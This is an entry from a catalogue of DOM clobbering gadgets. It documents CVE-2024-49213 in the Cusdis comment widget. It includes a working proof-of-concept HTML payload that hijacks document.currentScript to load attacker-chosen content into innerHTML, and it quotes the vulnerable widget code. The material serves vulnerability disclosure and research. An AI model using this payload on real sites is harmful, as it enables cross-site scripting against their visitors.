---
description: Cusdis is an open-source, lightweight (~5kb gzip), privacy-friendly alternative to Disqus.
github: djyde/cusdis
gadgets:
  Latest:
    cve: CVE-2024-49213
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - doc-tags
      - name-attr
      - data-attr
      - before-lib-load
    pocs:
      - description: The [Cusdis](https://cusdis.com/) library uses the `data-host` attribute on the `document.currentScript` node to fetch comments information. Then, it retrieves `s.data.data[e.dataset.cusdisCountPageId]` and `innerHTML` it in the DOM.
        code: |
          <!-- user input -->
          <img name="currentScript" data-host="[current-location]/assets/xss/cusdis.json?">

          <span data-cusdis-count-page-id="XXX-YYY-ZZZ"></span>
          <div id="cusdis_thread"
            data-host="https://cusdis.com"
            data-app-id="c157400c-80eb-4dca-acc7-3cd342adfb22"
            data-page-id="XXX-YYY-ZZZ"
            data-page-url="XXX"
            data-page-title="XXX"></div>
          </div>
          <script async defer src="https://cusdis.com/js/cusdis.es.js"></script>
          <script defer data-host="https://cusdis.com" data-app-id="c157400c-80eb-4dca-acc7-3cd342adfb22" src="https://cusdis.com/js/cusdis-count.umd.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/djyde/cusdis/blob/7bcf25611de75f52b337a9bb2e6b3f931822f56c/widget/count.js#L6">https://github.com/djyde/cusdis/blob/7bcf25611de75f52b337a9bb2e6b3f931822f56c/widget/count.js#L6</a>

      ```javascript
      export async function initial() {

        // local testing fallback
        const currentScript = document.currentScript || document.querySelector('#for-testing')

        const { appId, host } = currentScript.dataset
        const resolvedHost = host || 'https://cusdis.com'

        const nodes = document.querySelectorAll('*[data-cusdis-count-page-id]')

        const pageIds = Array.from(nodes).map(el => {
          return el.dataset.cusdisCountPageId
        })

        const results = await axios.get(`${resolvedHost}/api/open/project/${appId}/comments/count`, {
          params: {
            pageIds
          }
        })

        Array.from(nodes).forEach(el => {
          el.innerHTML = results.data.data[el.dataset.cusdisCountPageId]
        })
      }
      ```
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/cusdis.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
